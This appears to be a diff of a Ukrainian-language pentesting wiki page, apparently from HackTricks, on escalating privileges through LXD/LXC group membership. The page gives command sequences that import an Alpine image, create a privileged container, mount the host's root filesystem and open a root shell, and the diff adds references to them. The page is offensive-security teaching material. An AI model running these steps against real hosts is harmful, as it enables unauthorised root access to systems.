@@ -1,18 +1,16 @@
-# lxd/lxc Group - підвищення привілеїв
+# lxd/lxc Group - Privilege escalation
 
-{{#include ../../../banners/hacktricks-training.md}}
+Членство в групі керування LXD хоста (зазвичай _**lxd**_) може надати шлях до root, дозволяючи повний контроль над daemon.<sup>[[1]](#references)</sup>
 
-Якщо ви входите до групи _**lxd**_ **або** _**lxc**_, ви можете отримати root
+## Exploiting без internet
 
-## Експлуатація без internet
+### Method 1
 
-### Метод 1
+Ви можете завантажити образ Alpine для використання з LXD із trusted repository.
+Сервер образів Canonical для LXD публікує щоденні збірки: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
+Просто завантажте **lxd.tar.xz** і **rootfs.squashfs** з найновішої збірки (назва каталогу — це дата).<sup>[[8]](#references)</sup>
 
-Ви можете завантажити alpine image для використання з lxd із довіреного репозиторію.
-Canonical публікує щоденні збірки на своєму сайті: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
-Просто завантажте і **lxd.tar.xz**, і **rootfs.squashfs** з найновішої збірки. (Назва директорії — це дата).
-
-Також ви можете встановити на своїй машині цей distro builder: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (дотримуйтеся інструкцій на github):
+Також ви можете встановити distrobuilder на своїй машині, дотримуючись [інструкцій проєкту](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
 ```bash
 # Install requirements
 sudo apt update
@@ -35,7 +33,7 @@ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 # Create the container - Beware of architecture while compiling locally.
 sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
 ```
-Завантажте файли **incus.tar.xz** (**lxd.tar.xz**, якщо ви завантажили їх із репозиторію Canonical), додайте образ до репозиторію та створіть контейнер:
+Завантажте **incus.tar.xz** (**lxd.tar.xz**, якщо ви завантажили його із сервера образів Canonical) і **rootfs.squashfs**, потім імпортуйте образ і створіть контейнер.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -51,10 +49,10 @@ lxc list
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
 > [!CAUTION]
-> If you find this error _**Error: No storage pool found. Please create a new storage pool**_\
-> Run **`lxd init`** and set-up all options on default. Then **повторіть** попередній блок команд
+> Якщо ви бачите цю помилку _**Error: No storage pool found. Please create a new storage pool**_\
+> Виконайте **`lxd init`**, налаштуйте стандартний storage pool, а потім **повторіть** попередній фрагмент команд.<sup>[[2]](#references)</sup>
 
-Нарешті ви можете запустити container і отримати root:
+Зрештою, запустіть container і відкрийте root shell у файловій системі host:<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
@@ -62,7 +60,7 @@ lxc exec privesc /bin/sh
 ```
 ### Метод 2
 
-Створіть Alpine image і запустіть його, використовуючи flag `security.privileged=true`, змушуючи контейнер взаємодіяти з файловою системою хоста від імені root.
+Створіть Alpine image і запустіть його з прапором `security.privileged=true`, який відображає root контейнера на root хоста; монтування `/` після цього відкриває файлову систему хоста всередині контейнера.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
@@ -82,4 +80,15 @@ lxc init myimage mycontainer -c security.privileged=true
 # mount the /root into the image
 lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
 ```
+## References
+
+- [1] [Як посилити безпеку для LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
+- [2] [Контейнери та віртуальні машини LXD](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
+- [3] [Як копіювати та імпортувати images](https://canonical.com/lxd/docs/latest/howto/images_copy/)
+- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
+- [5] [Як створювати images за допомогою distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
+- [6] [Визначення Alpine image](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
+- [7] [Скрипт збірки lxd-alpine-builder](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
+- [8] [Сервер LXD image](https://images.lxd.canonical.com/)
+- [9] [Тип: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
 {{#include ../../../banners/hacktricks-training.md}}
